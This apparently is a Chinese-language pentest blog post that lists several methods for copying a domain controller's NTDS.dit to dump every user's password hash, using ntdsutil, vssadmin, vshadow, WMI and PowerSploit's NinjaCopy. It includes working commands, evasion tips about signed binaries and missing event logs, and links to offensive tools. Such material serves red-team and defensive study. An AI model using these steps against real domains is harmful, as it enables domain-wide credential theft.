@@ -1,0 +1,351 @@
+I"�1<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章《导出当前域内所有用户hash的技术整理》曾介绍过通过Volume Shadow Copy实现对ntds.dit文件的复制， 可用来导出域内所有用户hash。本文将尝试做系统总结，总结多种不同的方法。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>多种实现方法</li>
+  <li>比较优缺点</li>
+</ul>
+
+<h2 id="0x02-通过volume-shadow-copy获得域控服务器ntdsdit文件">0x02 通过Volume Shadow Copy获得域控服务器NTDS.dit文件</h2>
+<hr />
+
+<p>测试系统：</p>
+
+<ul>
+  <li>Server 2008 R2 x64</li>
+  <li>Server 2012 R2 x64</li>
+</ul>
+
+<p><strong>Volume Shadow Copy Service：</strong></p>
+
+<ul>
+  <li>用于数据备份</li>
+  <li>支持Windows Server 2003 及以上操作系统</li>
+  <li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li>
+  <li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li>
+</ul>
+
+<h3 id="1ntdsutil">1、ntdsutil</h3>
+
+<p>域环境默认安装</p>
+
+<p>支持系统：</p>
+
+<ul>
+  <li>Server 2003</li>
+  <li>Server 2008</li>
+  <li>Server 2012</li>
+  <li>…</li>
+</ul>
+
+<h4 id="常用命令">常用命令：</h4>
+
+<p>(1) 查询当前快照列表</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List All" quit quit
+</code></pre></div></div>
+
+<p>(2) 查询已挂载的快照列表</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List Mounted" quit quit
+</code></pre></div></div>
+
+<p>(3) 创建快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
+</code></pre></div></div>
+
+<p>(4) 挂载快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "mount GUID" quit quit
+</code></pre></div></div>
+
+<p>(5) 卸载快照:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "unmount GUID" quit quit
+</code></pre></div></div>
+
+<p>(6) 删除快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "delete GUID" quit quit
+</code></pre></div></div>
+
+<h4 id="实际测试">实际测试：</h4>
+
+<p>(1) 查询当前系统的快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List All" quit quit
+ntdsutil snapshot "List Mounted" quit quit
+</code></pre></div></div>
+
+<p>(2) 创建快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
+</code></pre></div></div>
+
+<p>guid为<code class="language-plaintext highlighter-rouge">{6e31c0ab-c517-420b-845d-c38acbf77ab9}</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-1.png" alt="Alt text" /></p>
+
+<p>(3) 挂载快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "mount {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
+</code></pre></div></div>
+
+<p>快照挂载为<code class="language-plaintext highlighter-rouge">C:\$SNAP_201802270645_VOLUMEC$\</code>，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-2.png" alt="Alt text" /></p>
+
+<p>(4) 复制ntds.dit</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
+</code></pre></div></div>
+
+<p>(5) 卸载快照:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot  "unmount {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
+</code></pre></div></div>
+
+<p>(6) 删除快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot  "delete {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
+</code></pre></div></div>
+
+<h3 id="2vssadmin">2、vssadmin</h3>
+
+<p>域环境默认安装</p>
+
+<p>支持系统：</p>
+
+<ul>
+  <li>Server 2008</li>
+  <li>Server 2012</li>
+  <li>…</li>
+</ul>
+
+<h4 id="常用命令-1">常用命令：</h4>
+
+<p>(1) 查询当前系统的快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
+</code></pre></div></div>
+
+<p>(2) 创建快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c:
+</code></pre></div></div>
+
+<p>(3) 删除快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
+</code></pre></div></div>
+
+<h4 id="实际测试-1">实际测试：</h4>
+
+<p>(1) 查询当前系统的快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
+</code></pre></div></div>
+
+<p>(2) 创建快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c:
+</code></pre></div></div>
+
+<p>获得Shadow Copy Volume Name为<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-3.png" alt="Alt text" /></p>
+
+<p>(3) 复制ntds.dit</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit
+</code></pre></div></div>
+
+<p>(4) 删除快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
+</code></pre></div></div>
+
+<h3 id="3vshadowexe">3、vshadow.exe</h3>
+
+<p>系统默认不支持,，可在Microsoft Windows Software Development Kit (SDK)中获得该工具</p>
+
+<p><strong>注：</strong></p>
+
+<p>64位系统需要使用64位的vshadow.exe</p>
+
+<p>不同系统可供使用的vshadow.exe下载地址：</p>
+
+<p>http://edgylogic.com/blog/vshadow-exe-versions/</p>
+
+<h4 id="常用命令-2">常用命令：</h4>
+
+<p>(1) 查询当前系统的快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -q
+</code></pre></div></div>
+
+<p>(2) 创建快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p -nw C:
+</code></pre></div></div>
+
+<p>参数说明：</p>
+
+<p>-p persistent，备份操作或是重启系统不会删除</p>
+
+<p>-nw no writers，用来提高创建速度</p>
+
+<p>C: 对应c盘</p>
+
+<p>(3) 删除快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -dx=ShadowCopySetId
+
+vshadow -ds=ShadowCopyId
+</code></pre></div></div>
+
+<h4 id="实际测试-2">实际测试：</h4>
+
+<p>(1) 查询当前系统的快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -q
+</code></pre></div></div>
+
+<p>(2) 创建快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p -nw C:
+</code></pre></div></div>
+
+<p>获得SnapshotSetID为<code class="language-plaintext highlighter-rouge">{809b77cc-cf9a-4101-b802-08e97d10e613}</code></p>
+
+<p>获得SnapshotID为<code class="language-plaintext highlighter-rouge">{ef99d039-9a38-4e8b-9f57-e3113d464f76}</code></p>
+
+<p>获得Shadow copy device name为<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-4.png" alt="Alt text" /></p>
+
+<p>(3) 复制ntds.dit</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds.dit
+</code></pre></div></div>
+
+<p>(4) 删除快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -dx={809b77cc-cf9a-4101-b802-08e97d10e613}
+</code></pre></div></div>
+
+<p>or</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -ds={ef99d039-9a38-4e8b-9f57-e3113d464f76}
+</code></pre></div></div>
+
+<h3 id="4vssownvbs">4、vssown.vbs</h3>
+
+<p>可供参考的下载地址：</p>
+
+<p>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</p>
+
+<p>本质上是通过wmi对ShadowCopy进行操作</p>
+
+<p>通过wmi查询快照信息：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list
+</code></pre></div></div>
+
+<p>powershell实现：</p>
+
+<p>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</p>
+
+<h3 id="扩展">扩展</h3>
+
+<h4 id="1日志文件">1、日志文件</h4>
+
+<p>调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036</p>
+
+<p>执行<code class="language-plaintext highlighter-rouge">ntdsutil snapshot "activate instance ntds" create quit quit</code>会额外产生Event ID为98的日志文件</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-5.png" alt="Alt text" /></p>
+
+<h4 id="2访问快照中的文件">2、访问快照中的文件</h4>
+
+<p>查看快照列表：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
+</code></pre></div></div>
+
+<p>无法直接访问<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code>中的文件</p>
+
+<p>可通过创建符号链接访问快照中的文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-6.png" alt="Alt text" /></p>
+
+<p>删除符号链接：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rd c:\testvsc
+</code></pre></div></div>
+
+<p>利用思路：</p>
+
+<p>如果当前系统存在快照文件，可对系统的历史文件进行访问</p>
+
+<h4 id="3利用vshadow执行命令">3、利用vshadow执行命令</h4>
+
+<p>参考资料：</p>
+
+<p>https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</p>
+
+<p>执行命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:
+</code></pre></div></div>
+
+<p>执行后，后台存在进程VSSVC.exe，同时显示服务Volume Shadow Copy正在运行，需要手动关闭进程VSSVC.exe</p>
+
+<p><strong>注：</strong></p>
+
+<p>手动关闭进程VSSVC.exe会生成日志7034</p>
+
+<p>利用思路：</p>
+
+<p>vshadow.exe包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示</p>
+
+<h2 id="0x03-通过ninjacopy获得域控服务器ntdsdit文件">0x03 通过NinjaCopy获得域控服务器NTDS.dit文件</h2>
+<hr />
+
+<p>下载地址：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</p>
+
+<p>没有调用Volume Shadow Copy服务，所以不会产生日志文件7036</p>
+
+<h2 id="0x04-小结">0x04 小结</h2>
+<hr />
+
+<p>本文整理了多种获得域控服务器NTDS.dit文件的方法，测试使用环境，比较优缺点。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
